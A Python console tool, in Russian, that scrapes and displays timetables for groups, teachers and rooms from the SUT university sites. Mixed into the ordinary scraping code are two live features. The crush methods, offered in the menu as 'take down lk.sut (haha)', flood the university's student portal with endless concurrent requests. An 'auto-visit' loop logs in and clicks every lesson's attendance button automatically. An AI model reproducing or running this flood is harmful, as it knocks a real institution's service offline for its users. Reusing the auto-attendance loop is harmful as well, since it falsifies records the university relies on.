import os, json, aiohttp, asyncio, threading, re
from bs4 import BeautifulSoup
from datetime import datetime, timedelta, time
from tqdm.asyncio import tqdm_asyncio
from time import sleep

if os.name=='nt': import msvcrt
else: import sys, fcntl, termios

class BonchAPI:
    def __init__(self, first_day: str, limit: int = 80):
        self.first_day = datetime.strptime(first_day, '%Y-%m-%d')
        self.set_current_week()
        self.limit = limit
        self.days_of_week_str_to_int = {'Понедельник': 0, 'Вторник': 1, 'Среда': 2, 'Четверг': 3, 'Пятница': 4, 'Суббота': 5}
        self.days_of_week = ['Понедельник', 'Вторник', 'Среда', 'Четверг', 'Пятница', 'Суббота']

    async def login(self, email: str, password: str) -> bool:
        AUTH = f'https://lk.sut.ru/cabinet/lib/autentificationok.php?users={email}&parole={password}'
        CABINET = 'https://lk.sut.ru/cabinet/'
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(10)) as session:
                async with session.get(f'{CABINET}?login=no') as response:
                    response.raise_for_status()
                    self.cookies = response.cookies
                    async with session.post(AUTH) as response:
                        response.raise_for_status()
                        text = await response.text()
                        if text == '1':
                            async with session.get(f'{CABINET}?login=yes') as response:
                                response.raise_for_status()
                                return True
                        else:
                            return False
        except Exception as e:
            return False

    async def auto_click(self, email: str, password: str, timeout: int = 15):
        URL = 'https://lk.sut.ru/cabinet/project/cabinet/forms/raspisanie.php'
        ERR_MSG = 'У Вас нет прав доступа. Или необходимо перезагрузить приложение..'

        response = False
        while not response:
            response = await self.login(email, password)

        while True:
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(10)) as session:
                    async with session.get(URL, cookies=self.cookies) as response:
                        response.raise_for_status()
                        text = await response.text()
                        if text == ERR_MSG:
                            response = False
                            while not response:
                                response = await self.login(email, password)
                            continue

                        soup = BeautifulSoup(text, 'html.parser')
                        week = soup.find('h3').text.split('№')[1].split()[0]
                        knop_ids = tuple(x['id'][4:] for x in soup.find_all('span') if x.get('id', '').startswith('knop'))

                        for lesson_id in knop_ids:
                            async with session.post(f'{URL}?open=1&rasp={lesson_id}&week={week}', cookies=self.cookies) as response:
                                pass
            except Exception as e:
                pass
            finally:
                sleep(timeout)

    def set_current_week(self):
        today = datetime.now()
        if today < self.first_day:
            self.cur_week = 0
        else:
            cur_day = self.first_day
            self.cur_week = 0
            while today > cur_day:
                self.cur_week += 1
                cur_day = cur_day + timedelta(days=7)
            cur_day = cur_day - timedelta(days=7)
            self.cur_week -= 1

    async def get_schet(self):
        URL = 'https://cabinet.sut.ru/raspisanie_all_new'

        async with aiohttp.ClientSession() as session:
            async with session.get(URL) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                schet_option = soup.find('select', id='schet')
                self.schet = schet_option.find('option', selected=True)['value']

    async def get_groups(self):
        URL = 'https://www.sut.ru/studentu/raspisanie/raspisanie-zanyatiy-studentov-ochnoy-i-vecherney-form-obucheniya'

        async with aiohttp.ClientSession() as session:
            async with session.get(URL) as response:
                response.raise_for_status()
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                groups = soup.find_all('a', class_='vt256')
                self.groups_id = {group['href'].split('=')[-1]: group['data-nm'] for group in groups}

    async def get_teachers(self):
        """
        Получает список преподавателей без авторизации.
        """
        URL = 'https://cabinet.sut.ru/raspisanie_all_new'

        async with aiohttp.ClientSession() as session:
            async with session.get(URL) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                
                # Ищем select для преподавателей (обычно id='prep' или name='prep')
                prep_select = soup.find('select', id='prep') or soup.find('select', {'name': 'prep'})
                if prep_select:
                    teachers = prep_select.find_all('option')
                    self.teachers_id = {opt['value']: opt.text.strip() for opt in teachers if opt.get('value')}
                else:
                    # Альтернативный способ: ищем ссылки на преподавателей
                    teacher_links = soup.find_all('a', href=re.compile(r'prep='))
                    self.teachers_id = {link['href'].split('prep=')[-1].split('&')[0]: link.text.strip() 
                                       for link in teacher_links if 'prep=' in link.get('href', '')}

    async def get_classrooms(self):
        """
        Получает список кабинетов без авторизации.
        """
        URL = 'https://cabinet.sut.ru/raspisanie_all_new'

        async with aiohttp.ClientSession() as session:
            async with session.get(URL) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                
                # Ищем select для кабинетов (обычно id='aud' или name='aud')
                aud_select = soup.find('select', id='aud') or soup.find('select', {'name': 'aud'})
                if aud_select:
                    classrooms = aud_select.find_all('option')
                    self.classrooms_id = {opt['value']: opt.text.strip() for opt in classrooms if opt.get('value')}
                else:
                    # Альтернативный способ: ищем ссылки на кабинеты
                    classroom_links = soup.find_all('a', href=re.compile(r'aud='))
                    self.classrooms_id = {link['href'].split('aud=')[-1].split('&')[0]: link.text.strip() 
                                         for link in classroom_links if 'aud=' in link.get('href', '')}

    async def get_timetable(self, session: aiohttp.ClientSession, type_z: str, group_id: str) -> list:
        URL = f'https://cabinet.sut.ru/raspisanie_all_new.php?schet={self.schet}&type_z={type_z}&group={group_id}'

        try:
            async with session.get(URL) as response:
                text = await response.text()

                soup = BeautifulSoup(text, 'html.parser')
                table = soup.find('table', class_='simple-little-table')
                if not table:
                    return 'Расписание не найдено'

                timetable_data = []
                rows = table.find('tbody').find_all('tr')[1:]

                for row in rows:
                    cells = row.find_all('td')
                    if not cells:
                        continue

                    lesson_number_cell = cells[0]
                    lesson_number_text = lesson_number_cell.text.strip()
                    lesson_number_parts = lesson_number_text.split()
                    lesson_number = lesson_number_parts[0] if lesson_number_parts else None

                    lesson_time = None
                    if lesson_number == '7':
                        lesson_time = '20:00-21:35'
                    elif len(lesson_number_parts) > 1:
                        lesson_time = lesson_number_parts[1][1:-1]

                    for day_index, cell in enumerate(cells[1:]):
                        pair_divs = cell.find_all('div', class_='pair')
                        if not pair_divs:
                            continue

                        day_name = self.days_of_week[day_index]
                        day_of_week_int = self.days_of_week_str_to_int[day_name]

                        for pair_div in pair_divs:
                            subject_element = pair_div.find('span', class_='subect')
                            subject = subject_element.strong.text.strip() if subject_element and subject_element.strong else None

                            type_element = pair_div.find('span', class_='type')
                            lesson_type = type_element.text.strip('()') if type_element else None

                            teacher_element = pair_div.find('span', class_='teacher')
                            teacher = teacher_element.text.strip() if teacher_element else None

                            room_element = pair_div.find('span', class_='aud')
                            room = room_element.text.split(':')[1].strip().replace('; Б22', '') if room_element and ':' in room_element.text else None

                            weeks_element = pair_div.find('span', class_='weeks')
                            week_number_str = weeks_element.text.strip('()').replace('н', '').replace('*', '') if weeks_element else None

                            if week_number_str:
                                weeks_list = [week.strip() for week in week_number_str.split(',')]
                            else:
                                weeks_list = []

                            for week_str in weeks_list:
                                week_number = int(week_str)
                                lesson_date = self.first_day + timedelta(days=week_number * 7 + day_of_week_int)

                                timetable_data.append({
                                    'Группа': self.groups_id[group_id],
                                    'Число': lesson_date.strftime('%Y.%m.%d'),
                                    'День недели': day_name,
                                    'Номер недели': week_number,
                                    'Номер дня недели': day_of_week_int,
                                    'Номер занятия': lesson_number,
                                    'Время занятия': lesson_time,
                                    'Предмет': subject,
                                    'Тип занятия': lesson_type,
                                    'ФИО преподавателя': teacher,
                                    'Номер кабинета': room,
                                })
                return sorted(timetable_data, key=lambda x: (x['Номер недели'], x['Номер дня недели']))
        except Exception as e:
            return 'Ошибка сервера'

    async def get_teacher_timetable(self, session: aiohttp.ClientSession, teacher_id: str) -> list:
        """
        Получает расписание преподавателя без авторизации.
        type_z='2' используется для преподавателей.
        """
        URL = f'https://cabinet.sut.ru/raspisanie_all_new.php?schet={self.schet}&type_z=2&prep={teacher_id}'

        try:
            async with session.get(URL) as response:
                text = await response.text()

                soup = BeautifulSoup(text, 'html.parser')
                table = soup.find('table', class_='simple-little-table')
                if not table:
                    return 'Расписание не найдено'

                timetable_data = []
                rows = table.find('tbody').find_all('tr')[1:]

                for row in rows:
                    cells = row.find_all('td')
                    if not cells:
                        continue

                    lesson_number_cell = cells[0]
                    lesson_number_text = lesson_number_cell.text.strip()
                    lesson_number_parts = lesson_number_text.split()
                    lesson_number = lesson_number_parts[0] if lesson_number_parts else None

                    lesson_time = None
                    if lesson_number == '7':
                        lesson_time = '20:00-21:35'
                    elif len(lesson_number_parts) > 1:
                        lesson_time = lesson_number_parts[1][1:-1]

                    for day_index, cell in enumerate(cells[1:]):
                        pair_divs = cell.find_all('div', class_='pair')
                        if not pair_divs:
                            continue

                        day_name = self.days_of_week[day_index]
                        day_of_week_int = self.days_of_week_str_to_int[day_name]

                        for pair_div in pair_divs:
                            subject_element = pair_div.find('span', class_='subect')
                            subject = subject_element.strong.text.strip() if subject_element and subject_element.strong else None

                            type_element = pair_div.find('span', class_='type')
                            lesson_type = type_element.text.strip('()') if type_element else None

                            teacher_element = pair_div.find('span', class_='teacher')
                            teacher = teacher_element.text.strip() if teacher_element else None

                            room_element = pair_div.find('span', class_='aud')
                            room = room_element.text.split(':')[1].strip().replace('; Б22', '') if room_element and ':' in room_element.text else None

                            weeks_element = pair_div.find('span', class_='weeks')
                            week_number_str = weeks_element.text.strip('()').replace('н', '').replace('*', '') if weeks_element else None

                            # Получаем группу из расписания преподавателя
                            group_element = pair_div.find('span', class_='group')
                            group_name = group_element.text.strip() if group_element else None

                            if week_number_str:
                                weeks_list = [week.strip() for week in week_number_str.split(',')]
                            else:
                                weeks_list = []

                            for week_str in weeks_list:
                                week_number = int(week_str)
                                lesson_date = self.first_day + timedelta(days=week_number * 7 + day_of_week_int)

                                timetable_data.append({
                                    'Группа': group_name,
                                    'Число': lesson_date.strftime('%Y.%m.%d'),
                                    'День недели': day_name,
                                    'Номер недели': week_number,
                                    'Номер дня недели': day_of_week_int,
                                    'Номер занятия': lesson_number,
                                    'Время занятия': lesson_time,
                                    'Предмет': subject,
                                    'Тип занятия': lesson_type,
                                    'ФИО преподавателя': teacher,
                                    'Номер кабинета': room,
                                })
                return sorted(timetable_data, key=lambda x: (x['Номер недели'], x['Номер дня недели']))
        except Exception as e:
            return 'Ошибка сервера'

    async def get_classroom_timetable(self, session: aiohttp.ClientSession, classroom_id: str) -> list:
        """
        Получает расписание кабинета без авторизации.
        type_z='3' используется для кабинетов.
        """
        URL = f'https://cabinet.sut.ru/raspisanie_all_new.php?schet={self.schet}&type_z=3&aud={classroom_id}'

        try:
            async with session.get(URL) as response:
                text = await response.text()

                soup = BeautifulSoup(text, 'html.parser')
                table = soup.find('table', class_='simple-little-table')
                if not table:
                    return 'Расписание не найдено'

                timetable_data = []
                rows = table.find('tbody').find_all('tr')[1:]

                for row in rows:
                    cells = row.find_all('td')
                    if not cells:
                        continue

                    lesson_number_cell = cells[0]
                    lesson_number_text = lesson_number_cell.text.strip()
                    lesson_number_parts = lesson_number_text.split()
                    lesson_number = lesson_number_parts[0] if lesson_number_parts else None

                    lesson_time = None
                    if lesson_number == '7':
                        lesson_time = '20:00-21:35'
                    elif len(lesson_number_parts) > 1:
                        lesson_time = lesson_number_parts[1][1:-1]

                    for day_index, cell in enumerate(cells[1:]):
                        pair_divs = cell.find_all('div', class_='pair')
                        if not pair_divs:
                            continue

                        day_name = self.days_of_week[day_index]
                        day_of_week_int = self.days_of_week_str_to_int[day_name]

                        for pair_div in pair_divs:
                            subject_element = pair_div.find('span', class_='subect')
                            subject = subject_element.strong.text.strip() if subject_element and subject_element.strong else None

                            type_element = pair_div.find('span', class_='type')
                            lesson_type = type_element.text.strip('()') if type_element else None

                            teacher_element = pair_div.find('span', class_='teacher')
                            teacher = teacher_element.text.strip() if teacher_element else None

                            room_element = pair_div.find('span', class_='aud')
                            room = room_element.text.split(':')[1].strip().replace('; Б22', '') if room_element and ':' in room_element.text else None

                            # Получаем группу из расписания кабинета
                            group_element = pair_div.find('span', class_='group')
                            group_name = group_element.text.strip() if group_element else None

                            weeks_element = pair_div.find('span', class_='weeks')
                            week_number_str = weeks_element.text.strip('()').replace('н', '').replace('*', '') if weeks_element else None

                            if week_number_str:
                                weeks_list = [week.strip() for week in week_number_str.split(',')]
                            else:
                                weeks_list = []

                            for week_str in weeks_list:
                                week_number = int(week_str)
                                lesson_date = self.first_day + timedelta(days=week_number * 7 + day_of_week_int)

                                timetable_data.append({
                                    'Группа': group_name,
                                    'Число': lesson_date.strftime('%Y.%m.%d'),
                                    'День недели': day_name,
                                    'Номер недели': week_number,
                                    'Номер дня недели': day_of_week_int,
                                    'Номер занятия': lesson_number,
                                    'Время занятия': lesson_time,
                                    'Предмет': subject,
                                    'Тип занятия': lesson_type,
                                    'ФИО преподавателя': teacher,
                                    'Номер кабинета': room,
                                })
                return sorted(timetable_data, key=lambda x: (x['Номер недели'], x['Номер дня недели']))
        except Exception as e:
            return 'Ошибка сервера'

    async def all_groups_timetable(self) -> dict:
        start = datetime.now()
        
        await self.get_schet()
        await self.get_groups()
        
        timetable = {}
        group_items = list(self.groups_id.items())
        connector = aiohttp.TCPConnector(limit=self.limit)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.get_timetable(session, '1', group_id) for group_id, _ in group_items]
            results = await tqdm_asyncio.gather(*tasks, desc='Загрузка групп', unit=' Групп',
                bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} | {rate_fmt}{postfix}')
            timetable = {group_name: results[index] for index, (_, group_name) in enumerate(group_items) if not isinstance(results[index], str)}
        self.save_to_json(timetable)
        end = datetime.now()
        print(f'Всего групп получено: {len(timetable)}')
        print(f'Потрачено времени: {(end - start).total_seconds()} секунд\n')
        return timetable

    @staticmethod
    def parse_lesson_time(time_str) -> datetime:
        if not time_str: return time(0, 0)
        start_time_str = time_str.split('-')[0]
        try: return datetime.strptime(start_time_str, '%H:%M').time()
        except ValueError: return time(0, 0)

    @staticmethod
    def teacher_timetable(timetable: dict, teacher: str) -> list:
        teacher_lessons = []
        for _, lessons in timetable.items():
            for lesson in lessons:
                if lesson['ФИО преподавателя'] and teacher in lesson['ФИО преподавателя']:
                    teacher_lessons.append(lesson)

        return sorted(teacher_lessons, key=lambda x: (x['Номер недели'], x['Номер дня недели'], BonchAPI.parse_lesson_time(x['Время занятия'])))

    @staticmethod
    def classroom_timetable(timetable: dict, classroom: str) -> list:
        classroom_lessons = []
        for _, lessons in timetable.items():
            for lesson in lessons:
                if lesson['Номер кабинета'] and classroom in lesson['Номер кабинета']:
                    classroom_lessons.append(lesson)

        return sorted(classroom_lessons, key=lambda x: (x['Номер недели'], x['Номер дня недели'], BonchAPI.parse_lesson_time(x['Время занятия'])))

    @staticmethod
    def format_output(timetable: list, week_number: int = None) -> str:
        output = ''

        if not timetable:
            output += 'Нет занятий для отображения\n'
            return output

        lessons_by_week = {}
        if week_number is None:
            for lesson in timetable:
                week = lesson['Номер недели']
                if week not in lessons_by_week:
                    lessons_by_week[week] = []
                lessons_by_week[week].append(lesson)
        else:
            lessons_by_week[week_number] = [lesson for lesson in timetable if lesson['Номер недели'] == week_number]
            if not lessons_by_week[week_number]:
                output += f'Нет занятий для недели {week_number}\n'
                return output

        for week, week_lessons in lessons_by_week.items():
            output += f'Неделя №{week}\n\n'

            grouped_lessons = {}
            for lesson in week_lessons:
                key = (lesson['Число'], lesson['Номер занятия'], lesson['Предмет'], lesson['Номер кабинета'])
                if key not in grouped_lessons:
                    grouped_lessons[key] = {
                        'Число': lesson['Число'],
                        'День недели': lesson['День недели'],
                        'Время занятия': lesson['Время занятия'],
                        'Номер занятия': lesson['Номер занятия'],
                        'Предмет': lesson['Предмет'],
                        'Группы': {lesson['Группа']},
                        'Преподаватели': set(),
                        'Тип занятия': lesson.get('Тип занятия', ''),
                        'Номер кабинета': lesson['Номер кабинета'],
                    }

                    teacher_string = lesson.get('ФИО преподавателя', '')
                    if teacher_string:
                        teachers = [t.strip() for t in teacher_string.split(';')]
                        for teacher in teachers:
                            grouped_lessons[key]['Преподаватели'].add(teacher)
                    else:
                        grouped_lessons[key]['Преподаватели'] = set()

                else:
                    grouped_lessons[key]['Группы'].add(lesson['Группа'])

                    teacher_string = lesson.get('ФИО преподавателя', '')
                    if teacher_string:
                        teachers = [t.strip() for t in teacher_string.split(';')]
                        for teacher in teachers:
                            grouped_lessons[key]['Преподаватели'].add(teacher)

            lessons_list = list(grouped_lessons.values())
            lessons_list.sort(key=lambda x: (x['Число'], BonchAPI.parse_lesson_time(x['Время занятия'])))

            if lessons_list:
                prev_day = lessons_list[0]['Число']
                day_of_week = lessons_list[0]['День недели']
                output += f'{prev_day} | {day_of_week}\n\n'

                for lesson in lessons_list:
                    cur_day = lesson['Число']
                    if cur_day != prev_day:
                        day_of_week = lesson['День недели']
                        prev_day = cur_day
                        output += f'{prev_day} | {day_of_week}\n\n'

                    lesson_time = lesson['Время занятия']
                    lesson_number = lesson['Номер занятия']
                    subject = lesson['Предмет']
                    groups = ', '.join(sorted(lesson['Группы']))
                    lesson_type = lesson.get('Тип занятия', '')
                    teachers = '; '.join(sorted(lesson['Преподаватели']))
                    room = lesson['Номер кабинета']

                    output += f'{lesson_time}\n'
                    output += f'{lesson_number}. {subject} | {groups}\n'
                    if lesson_type: output += f'{lesson_type}\n'
                    if teachers: output += f'{teachers}\n'
                    if room: output += f'{room}\n'
                    output += '\n'
            else:
                output += "Нет занятий на этой неделе\n\n"

        output = output[:-1]
        return output

    @staticmethod
    def save_to_json(timetable: dict, filepath: str = 'timetable.json'):
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(timetable, f, indent=4, ensure_ascii=False)
            print(f'Расписание сохранено в файл: {filepath}\n')
        except Exception as e:
            print(f'Ошибка при сохранении расписания в файл: {e}\n')

    @staticmethod
    def load_from_json(filepath: str = 'timetable.json') -> dict:
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                timetable = json.load(f)
            print(f'Расписание загружено из файла: {filepath}\n')
            return timetable
        except Exception as e:
            print(f'Ошибка при загрузке расписания из файла: {e}\n')
            return None

    @staticmethod
    def cls():
        os.system('cls' if os.name=='nt' else 'clear')

    @staticmethod
    def wait_key() -> bytes:
        if os.name == 'nt':
            return msvcrt.getch()
        else:
            fd = sys.stdin.fileno()
            flags_save = fcntl.fcntl(fd, fcntl.F_GETFL)
            attrs_save = termios.tcgetattr(fd)
            attrs = list(attrs_save)
            attrs[0] &= ~(termios.IGNBRK | termios.BRKINT | termios.PARMRK
                        | termios.ISTRIP | termios.INLCR | termios.IGNCR
                        | termios.ICRNL | termios.IXON)
            attrs[1] &= ~termios.OPOST
            attrs[2] &= ~(termios.CSIZE | termios.PARENB)
            attrs[2] |= termios.CS8
            attrs[3] &= ~(termios.ECHONL | termios.ECHO | termios.ICANON
                        | termios.ISIG | termios.IEXTEN)
            termios.tcsetattr(fd, termios.TCSANOW, attrs)
            fcntl.fcntl(fd, fcntl.F_SETFL, flags_save & ~os.O_NONBLOCK)
            ret = []
            try:
                ret.append(sys.stdin.read(1))
                fcntl.fcntl(fd, fcntl.F_SETFL, flags_save | os.O_NONBLOCK)
                c = sys.stdin.read(1)
                while len(c) > 0:
                    ret.append(c)
                    c = sys.stdin.read(1)
            except KeyboardInterrupt:
                ret.append('\x03')
            finally:
                termios.tcsetattr(fd, termios.TCSAFLUSH, attrs_save)
                fcntl.fcntl(fd, fcntl.F_SETFL, flags_save)
            return bytes(''.join(ret), encoding='utf-8')

    def timetable_interface(self, timetable: dict):
        self.cls()
        inp = b'-'
        self.change_group_name(timetable, self.group_name)
        while inp != b'\x1b':
            print(f'Расписание группы: {self.group_name}\n')
            print(self.format_output(timetable[self.group_name], self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    def teacher_timetable_interface(self, timetable: dict, teacher: str):
        self.cls()
        inp = b'-'
        while inp != b'\x1b':
            print(f'Расписание преподавателя: {teacher}\n')
            teacher_timetable = self.teacher_timetable(timetable, teacher)
            print(self.format_output(teacher_timetable, self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    def classroom_timetable_interface(self, timetable: dict, classroom: str):
        self.cls()
        inp = b'-'
        while inp != b'\x1b':
            print(f'Расписание кабинета: {classroom}\n')
            classroom_timetable = self.classroom_timetable(timetable, classroom)
            print(self.format_output(classroom_timetable, self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    def change_group_name(self, timetable: dict, group_name: str):
        if group_name in timetable: self.group_name = group_name
        elif self.group_name not in timetable: self.group_name = next(iter(timetable.keys()))

    async def crush_request(self, session: aiohttp.ClientSession, type_z: str, group_id: str):
        URL = f'https://lk.sut.ru/cabinet/project/cabinet/forms/raspisanie_all.php?schet={self.schet}&type_z={type_z}&group={group_id}'
        try:
            async with session.get(URL, cookies=self.cookies) as response:
                return response.status
        except Exception as e:
            return 'Ошибка подключения'
    
    async def crush(self, limit: int = 100):
        response = False
        while not response:
            response = await self.login(self.email, self.password)

        await self.get_schet()
        await self.get_groups()

        group_items = list(self.groups_id.items())
        connector = aiohttp.TCPConnector(limit=limit)
        while True:
            try:
                async with aiohttp.ClientSession(connector=connector) as session:
                    tasks = [self.crush_request(session, '1', group_id) for group_id, _ in group_items]
                    await asyncio.gather(*tasks)
            except Exception as e:
                pass

    def crush_lk_interface(self, limit: int = 100):
        if hasattr(self, 'email') and hasattr(self, 'password'):
            thread = threading.Thread(
                target=lambda: asyncio.run(self.crush(limit)),
                daemon=True
            )
            thread.start()
            print('Атака на lk.sut запущена\n')
        else:
            print('Для атаки требуются login и password в конфигурации\n')

    @classmethod
    def read_options(cls, filename: str = 'options.txt') -> 'BonchAPI':
        options = {}
        
        with open(filename, 'r', encoding='utf-8') as file:
            for line in file:
                clean_line = line.split('#')[0].strip()
                if not clean_line or '=' not in clean_line: continue
                key, value = clean_line.split('=', 1)
                options[key.strip()] = value.strip()

        if 'first_day' not in options:
            raise ValueError('Не указан обязательный параметр first_day в файле конфигурации')

        instance = cls(
            first_day=options['first_day'],
            limit=int(options.get('limit', 80))
        )

        if 'login' in options and 'password' in options:
            instance.email = options['login']
            instance.password = options['password']

        if options.get('auto-visit', 'False').lower() == 'true':
            if 'login' in options and 'password' in options:
                thread = threading.Thread(
                    target=lambda: asyncio.run(instance.auto_click(options['login'], options['password'])),
                    daemon=True
                )
                thread.start()
            else:
                print('Для авто-посещения требуются login и password в конфигурации\n')

        if 'group_name' in options:
            instance.group_name = options['group_name']

        return instance

async def main():
    '''
        Укажите в файле options.txt:

        # Обязательные параметры
        first_day=2025-02-03   # Первый день семестра

        # Опциональные параметры
        group_name=ИКПИ-22     # Ваша группа
        limit=20               # Количество одновременных запросов
        auto-visit=True        # Вкл/Выкл автопосещение
        login=your_login       # Логин для автопосещения
        password=your_password # Пароль для автопосещения
    '''

    api = BonchAPI.read_options()

    while True:
        timetable = None
        while timetable is None:
            print('[1] - получить расписание из sut.ru')
            print('[2] - получить расписание из timetable.json')
            print('[Esc] - выйти')
            inp = BonchAPI.wait_key()
            BonchAPI.cls()
            if inp == b'1': timetable = await api.all_groups_timetable()
            elif inp == b'2': timetable = BonchAPI.load_from_json()
            elif inp == b'\x1b': exit(0)

        inp = b'-'
        api.change_group_name(timetable, api.group_name)
        while inp != b'\x1b':
            print(f'Текущая неделя: {api.cur_week}\n')
            print(f'[1] - получить расписание группы')
            print(f'[2] - получить расписание преподавателя')
            print(f'[3] - получить расписание кабинета')
            print(f'[4] - изменить группу (текущая: {api.group_name})')
            print(f'[5] - положить lk.sut (ахаха)')
            print(f'[Esc] - выйти')
            inp = BonchAPI.wait_key()
            BonchAPI.cls()
            if inp == b'1':
                api.timetable_interface(timetable)
            elif inp == b'2':
                teacher = input('Фамилия (И.О.) преподавателя: ')
                api.teacher_timetable_interface(timetable, teacher)
            elif inp == b'3':
                classroom = input('Номер кабинета: ')
                api.classroom_timetable_interface(timetable, classroom)
            elif inp == b'4':
                group_name = input('Название группы: ')
                api.change_group_name(timetable, group_name)
                BonchAPI.cls()
            elif inp == b'5':
                api.crush_lk_interface()

if __name__ == '__main__':
    asyncio.run(main())